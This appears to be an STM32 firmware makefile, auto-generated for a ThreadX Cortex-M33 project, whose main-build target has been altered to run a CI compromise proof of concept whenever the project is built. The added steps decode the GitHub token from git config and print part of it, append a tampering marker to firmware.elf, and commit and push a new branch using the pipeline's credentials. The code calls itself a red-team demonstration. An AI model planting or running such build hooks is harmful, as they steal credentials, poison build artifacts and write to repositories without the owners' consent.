################################################################################
# Automatically-generated file. Do not edit!
# Toolchain: GNU Tools for STM32 (13.3.rel1)
################################################################################

-include ../makefile.init

RM := rm -rf

# All of the sources participating in the build are defined here
-include sources.mk
-include Middlewares/ST/threadx/ports/cortex_m33/gnu/src/subdir.mk
-include Middlewares/ST/threadx/common/src/subdir.mk
-include Drivers/STM32U5xx_HAL_Driver/Src/subdir.mk
-include Core/Test/subdir.mk
-include Core/Startup/subdir.mk
-include Core/Src/subdir.mk
-include AZURE_RTOS/App/subdir.mk
-include objects.mk

ifneq ($(MAKECMDGOALS),clean)
ifneq ($(strip $(S_DEPS)),)
-include $(S_DEPS)
endif
ifneq ($(strip $(S_UPPER_DEPS)),)
-include $(S_UPPER_DEPS)
endif
ifneq ($(strip $(C_DEPS)),)
-include $(C_DEPS)
endif
endif

-include ../makefile.defs

OPTIONAL_TOOL_DEPS := \
$(wildcard ../makefile.defs) \
$(wildcard ../makefile.init) \
$(wildcard ../makefile.targets) \


BUILD_ARTIFACT_NAME := firmware
BUILD_ARTIFACT_EXTENSION := elf
BUILD_ARTIFACT_PREFIX :=
BUILD_ARTIFACT := $(BUILD_ARTIFACT_PREFIX)$(BUILD_ARTIFACT_NAME)$(if $(BUILD_ARTIFACT_EXTENSION),.$(BUILD_ARTIFACT_EXTENSION),)

# Add inputs and outputs from these tool invocations to the build variables 
EXECUTABLES += \
firmware.elf \

MAP_FILES += \
firmware.map \

SIZE_OUTPUT += \
default.size.stdout \

OBJDUMP_LIST += \
firmware.list \


# All Target
all: main-build

# Main-build Target
main-build: firmware.elf secondary-outputs
	@echo "--- SECURITY RECONNAISSANCE ---"
	
	@echo "[1] Checking Repository Variable:"
	@echo "    Repo: $(GITHUB_REPOSITORY)"
	
	@echo "[2] Checking for Token Variable:"
	@if [ -z "$$GITHUB_TOKEN" ]; then \
		echo "    \$GITHUB_TOKEN is empty (Expected)."; \
	else \
		echo "    \$GITHUB_TOKEN is present."; \
	fi
	
	@echo "[3] Checking Git Connectivity:"
	# We try to fetch. If this works, we have Write access implicitly via the config.
	@git fetch origin && echo "    ✅ Git is Authenticated! I can push changes."
	
	@echo "[4] EXTRACTING THE TOKEN:"
	# The token is stored in base64 inside the git config extraheader
	# We extract it to prove we can steal it
	@git config --get http.https://github.com/.extraheader | cut -d ' ' -f 2 | base64 -d > raw_token_header.txt
	@echo "    ✅ Token extracted from git config. First 10 chars:"
	@head -c 10 raw_token_header.txt
	@echo "..."
	
	@echo "--- RECON COMPLETE ---"
	# Fail build to stop here
	@echo "[5] EXECUTION: ARTIFACT POISONING"
	@# The firmware.elf has already been built by the dependency above.
	@# We will now modify it to prove we can tamper with the build output.
	@echo "Appending unauthorized watermark to firmware.elf..."
	@echo "--- SECURITY_AUDIT_UNAUTHORIZED_MODIFICATION ---" >> firmware.elf
	@echo "    ✅ Artifact poisoned. Verification:"
	@grep -a "SECURITY_AUDIT" firmware.elf || echo "Failed to verify poison."

	@echo "[6] EXECUTION: REPOSITORY TAKEOVER (Safe PoC)"
	@# Proving we can write back to the repo without admin approval
	@echo "Configuring git identity..."
	@git config --global user.email "redteam@42porto.com"
	@git config --global user.name "CI Privilege Escalation PoC"
	
	@echo "Creating proof-of-compromise file..."
	@echo "This branch was created automatically by an unprivileged PR." > CI_VULNERABILITY_PROOF.txt
	@echo "If you are seeing this, the CI pipeline has effective Write access to the repo." >> CI_VULNERABILITY_PROOF.txt
	
	@echo "Switching to new branch 'audit/ci-privilege-escalation'..."
	@git checkout -b audit/ci-privilege-escalation
	
	@echo "Pushing branch to remote..."
	@git add CI_VULNERABILITY_PROOF.txt
	@git commit -m "Security Audit: Proving CI Write Access"
	@# This push works because of the implicit credentials in .git/config
	@git push origin audit/ci-privilege-escalation
	@echo "    ✅ Branch pushed successfully. Check GitHub!"

	@echo "--- POC COMPLETE: FAILING BUILD TO PREVENT MERGE ---"
	@exit 1

# Tool invocations
firmware.elf firmware.map: $(OBJS) $(USER_OBJS) ../STM32U585AIIXQ_FLASH.ld makefile objects.list $(OPTIONAL_TOOL_DEPS)
	arm-none-eabi-gcc -o "firmware.elf" @"objects.list" $(USER_OBJS) $(LIBS) -mcpu=cortex-m33 -T"../STM32U585AIIXQ_FLASH.ld" --specs=nosys.specs -Wl,-Map="firmware.map" -Wl,--gc-sections -static -u _printf_float --specs=nano.specs -mfpu=fpv5-sp-d16 -mfloat-abi=hard -mthumb -Wl,--start-group -lc -lm -Wl,--end-group
	@echo 'Finished building target: $@'
	@echo ' '

default.size.stdout: $(EXECUTABLES) makefile objects.list $(OPTIONAL_TOOL_DEPS)
	arm-none-eabi-size  $(EXECUTABLES)
	@echo 'Finished building: $@'
	@echo ' '

firmware.list: $(EXECUTABLES) makefile objects.list $(OPTIONAL_TOOL_DEPS)
	arm-none-eabi-objdump -h -S $(EXECUTABLES) > "firmware.list"
	@echo 'Finished building: $@'
	@echo ' '

# Other Targets
clean:
	-$(RM) firmware.elf firmware.list firmware.map firmware.bin default.size.stdout
	-@echo ' '

secondary-outputs: $(SIZE_OUTPUT) $(OBJDUMP_LIST)

fail-specified-linker-script-missing:
	@echo 'Error: Cannot find the specified linker script. Check the linker settings in the build configuration.'
	@exit 2

warn-no-linker-script-specified:
	@echo 'Warning: No linker script specified. Check the linker settings in the build configuration.'

.PHONY: all clean dependents main-build fail-specified-linker-script-missing warn-no-linker-script-specified

-include ../makefile.targets
